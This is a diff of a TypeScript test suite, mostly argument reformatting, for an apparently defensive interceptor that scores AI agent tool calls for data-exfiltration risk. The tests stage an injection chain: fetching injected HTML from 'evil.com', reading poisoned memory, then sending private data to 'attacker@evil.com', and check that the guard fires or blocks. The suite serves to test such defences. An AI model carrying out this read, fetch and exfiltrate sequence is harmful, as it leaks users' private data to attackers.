@@ -43,7 +43,11 @@ describe('interceptToolCall', () => {
     const executor = vi.fn().mockResolvedValue(PRIVATE_DATA);
     const assessments: RiskAssessment[] = [];
     const wrapped = interceptToolCall(
-      'readPrivateData', executor, session, BASE_CONFIG, OUTBOUND_TOOLS,
+      'readPrivateData',
+      executor,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
       (a) => assessments.push(a),
     );
 
@@ -59,7 +63,11 @@ describe('interceptToolCall', () => {
     const executor = vi.fn().mockResolvedValue('<html>content</html>');
     const assessments: RiskAssessment[] = [];
     const wrapped = interceptToolCall(
-      'fetchExternalContent', executor, session, BASE_CONFIG, OUTBOUND_TOOLS,
+      'fetchExternalContent',
+      executor,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
       (a) => assessments.push(a),
     );
 
@@ -78,7 +86,11 @@ describe('interceptToolCall', () => {
     const executor = vi.fn().mockResolvedValue('sent');
     const assessments: RiskAssessment[] = [];
     const wrapped = interceptToolCall(
-      'sendOutboundReport', executor, session, BASE_CONFIG, OUTBOUND_TOOLS,
+      'sendOutboundReport',
+      executor,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
       (a) => assessments.push(a),
     );
 
@@ -97,7 +109,9 @@ describe('interceptToolCall', () => {
     const onAssessment = vi.fn();
 
     const wrapped = interceptToolCall(
-      'readPrivateData', executor, session,
+      'readPrivateData',
+      executor,
+      session,
       { ...BASE_CONFIG, onAssessment },
       OUTBOUND_TOOLS,
     );
@@ -114,7 +128,13 @@ describe('interceptToolCall', () => {
   it('should increment turn counter per call', async () => {
     const session = createSession();
     const executor = vi.fn().mockResolvedValue('data');
-    const wrapped = interceptToolCall('readPrivateData', executor, session, BASE_CONFIG, OUTBOUND_TOOLS);
+    const wrapped = interceptToolCall(
+      'readPrivateData',
+      executor,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
+    );
 
     await wrapped({});
     await wrapped({});
@@ -141,7 +161,11 @@ describe('interceptToolCall', () => {
 
     // Make this an outbound tool to trigger L3
     const wrapped = interceptToolCall(
-      'sendOutboundReport', executor, session, config, OUTBOUND_TOOLS,
+      'sendOutboundReport',
+      executor,
+      session,
+      config,
+      OUTBOUND_TOOLS,
     );
 
     // This should NOT trigger L3 because no trust overrides means no L1/L2
@@ -164,9 +188,7 @@ describe('interceptToolCall', () => {
       trustOverrides: TRUST_OVERRIDES,
     };
 
-    const wrapped = interceptToolCall(
-      'readPrivateData', executor, session, config, OUTBOUND_TOOLS,
-    );
+    const wrapped = interceptToolCall('readPrivateData', executor, session, config, OUTBOUND_TOOLS);
 
     const result = await wrapped({});
     expect(result).toBe('tool output');
@@ -176,7 +198,11 @@ describe('interceptToolCall', () => {
     const session = createSession();
     const executor = vi.fn().mockResolvedValue(PRIVATE_DATA);
     const wrapped = interceptToolCall(
-      'readPrivateData', executor, session, BASE_CONFIG, OUTBOUND_TOOLS,
+      'readPrivateData',
+      executor,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
     );
 
     await wrapped({});
@@ -190,12 +216,19 @@ describe('interceptToolCall', () => {
   it('should handle full Lethal Trifecta scenario', async () => {
     const session = createSession();
     const assessments: RiskAssessment[] = [];
-    const onFull = (a: RiskAssessment): void => { assessments.push(a); };
+    const onFull = (a: RiskAssessment): void => {
+      assessments.push(a);
+    };
 
     // Step 1: Read private data (L1)
     const readExec = vi.fn().mockResolvedValue(PRIVATE_DATA);
     const wrappedRead = interceptToolCall(
-      'readPrivateData', readExec, session, BASE_CONFIG, OUTBOUND_TOOLS, onFull,
+      'readPrivateData',
+      readExec,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
+      onFull,
     );
     await wrappedRead({});
 
@@ -205,7 +238,12 @@ describe('interceptToolCall', () => {
     // Step 2: Fetch external content (L2)
     const fetchExec = vi.fn().mockResolvedValue('<html>injected</html>');
     const wrappedFetch = interceptToolCall(
-      'fetchExternalContent', fetchExec, session, BASE_CONFIG, OUTBOUND_TOOLS, onFull,
+      'fetchExternalContent',
+      fetchExec,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
+      onFull,
     );
     await wrappedFetch({ url: 'https://evil.com' });
 
@@ -214,7 +252,12 @@ describe('interceptToolCall', () => {
     // Step 3: Send outbound report with PII (L3 triggers)
     const sendExec = vi.fn().mockResolvedValue('sent');
     const wrappedSend = interceptToolCall(
-      'sendOutboundReport', sendExec, session, BASE_CONFIG, OUTBOUND_TOOLS, onFull,
+      'sendOutboundReport',
+      sendExec,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
+      onFull,
     );
     const sendResult = await wrappedSend({
       recipient: 'attacker@evil.com',
@@ -249,7 +292,11 @@ describe('interceptToolCall', () => {
     // First, run L1 to populate session
     const readExec = vi.fn().mockResolvedValue(PRIVATE_DATA);
     const wrappedRead = interceptToolCall(
-      'readPrivateData', readExec, session, config, OUTBOUND_TOOLS,
+      'readPrivateData',
+      readExec,
+      session,
+      config,
+      OUTBOUND_TOOLS,
       (a) => assessments.push(a),
     );
     await wrappedRead({});
@@ -257,7 +304,11 @@ describe('interceptToolCall', () => {
     // Now L3 should fire and block
     const sendExec = vi.fn().mockResolvedValue('sent');
     const wrappedSend = interceptToolCall(
-      'sendOutboundReport', sendExec, session, config, OUTBOUND_TOOLS,
+      'sendOutboundReport',
+      sendExec,
+      session,
+      config,
+      OUTBOUND_TOOLS,
       (a) => assessments.push(a),
     );
 
@@ -285,7 +336,11 @@ describe('interceptToolCall — L4 integration', () => {
     const assessments: RiskAssessment[] = [];
 
     const wrapped = interceptToolCall(
-      'readMemory', executor, session, BASE_CONFIG, OUTBOUND_TOOLS,
+      'readMemory',
+      executor,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
       (a) => assessments.push(a),
     );
 
@@ -314,9 +369,15 @@ describe('interceptToolCall — L4 integration', () => {
 
     const executor = vi.fn().mockResolvedValue('injected data');
     const wrapped = interceptToolCall(
-      'readMemory', executor, session, BASE_CONFIG, OUTBOUND_TOOLS,
+      'readMemory',
+      executor,
+      session,
+      BASE_CONFIG,
+      OUTBOUND_TOOLS,
       (a) => assessments.push(a),
-      MEMORY_TOOLS, graph, ledger,
+      MEMORY_TOOLS,
+      graph,
+      ledger,
     );
 
     await wrapped({ key: 'user-prefs' });
@@ -336,16 +397,19 @@ describe('interceptToolCall — L4 integration', () => {
     const executor = vi.fn().mockResolvedValue('ok');
     const config: CerberusConfig = {
       ...BASE_CONFIG,
-      trustOverrides: [
-        ...TRUST_OVERRIDES,
-        { toolName: 'writeMemory', trustLevel: 'untrusted' },
-      ],
+      trustOverrides: [...TRUST_OVERRIDES, { toolName: 'writeMemory', trustLevel: 'untrusted' }],
     };
 
     const wrapped = interceptToolCall(
-      'writeMemory', executor, session, config, OUTBOUND_TOOLS,
+      'writeMemory',
+      executor,
+      session,
+      config,
+      OUTBOUND_TOOLS,
       (a) => assessments.push(a),
-      MEMORY_TOOLS, graph, ledger,
+      MEMORY_TOOLS,
+      graph,
+      ledger,
     );
 
     await wrapped({ key: 'test-node', value: 'some data' });
@@ -375,7 +439,9 @@ describe('interceptToolCall — L4 integration', () => {
       trustOverrides: TRUST_OVERRIDES,
     };
 
-    const onFull = (a: RiskAssessment): void => { assessments.push(a); };
+    const onFull = (a: RiskAssessment): void => {
+      assessments.push(a);
+    };
 
     // Pre-contaminate memory from session-A
     graph.writeNode({
@@ -390,8 +456,15 @@ describe('interceptToolCall — L4 integration', () => {
     // Step 1: Read private data (L1)
     const readExec = vi.fn().mockResolvedValue(PRIVATE_DATA);
     const wrappedRead = interceptToolCall(
-      'readPrivateData', readExec, session, config, OUTBOUND_TOOLS, onFull,
-      MEMORY_TOOLS, graph, ledger,
+      'readPrivateData',
+      readExec,
+      session,
+      config,
+      OUTBOUND_TOOLS,
+      onFull,
+      MEMORY_TOOLS,
+      graph,
+      ledger,
     );
     await wrappedRead({});
     expect(assessments[0].vector.l1).toBe(true);
@@ -399,8 +472,15 @@ describe('interceptToolCall — L4 integration', () => {
     // Step 2: Fetch external content (L2)
     const fetchExec = vi.fn().mockResolvedValue('<html>injected</html>');
     const wrappedFetch = interceptToolCall(
-      'fetchExternalContent', fetchExec, session, config, OUTBOUND_TOOLS, onFull,
-      MEMORY_TOOLS, graph, ledger,
+      'fetchExternalContent',
+      fetchExec,
+      session,
+      config,
+      OUTBOUND_TOOLS,
+      onFull,
+      MEMORY_TOOLS,
+      graph,
+      ledger,
     );
     await wrappedFetch({ url: 'https://evil.com' });
     expect(assessments[1].vector.l2).toBe(true);
@@ -408,8 +488,15 @@ describe('interceptToolCall — L4 integration', () => {
     // Step 3: Read contaminated memory (L4)
     const memReadExec = vi.fn().mockResolvedValue('payload');
     const wrappedMemRead = interceptToolCall(
-      'readMemory', memReadExec, session, config, OUTBOUND_TOOLS, onFull,
-      MEMORY_TOOLS, graph, ledger,
+      'readMemory',
+      memReadExec,
+      session,
+      config,
+      OUTBOUND_TOOLS,
+      onFull,
+      MEMORY_TOOLS,
+      graph,
+      ledger,
     );
     await wrappedMemRead({ key: 'secret-data' });
     expect(assessments[2].vector.l4).toBe(true);
@@ -417,8 +504,15 @@ describe('interceptToolCall — L4 integration', () => {
     // Step 4: Send outbound with PII (L3)
     const sendExec = vi.fn().mockResolvedValue('sent');
     const wrappedSend = interceptToolCall(
-      'sendOutboundReport', sendExec, session, config, OUTBOUND_TOOLS, onFull,
-      MEMORY_TOOLS, graph, ledger,
+      'sendOutboundReport',
+      sendExec,
+      session,
+      config,
+      OUTBOUND_TOOLS,
+      onFull,
+      MEMORY_TOOLS,
+      graph,
+      ledger,
     );
     const sendResult = await wrappedSend({
       recipient: 'attacker@evil.com',
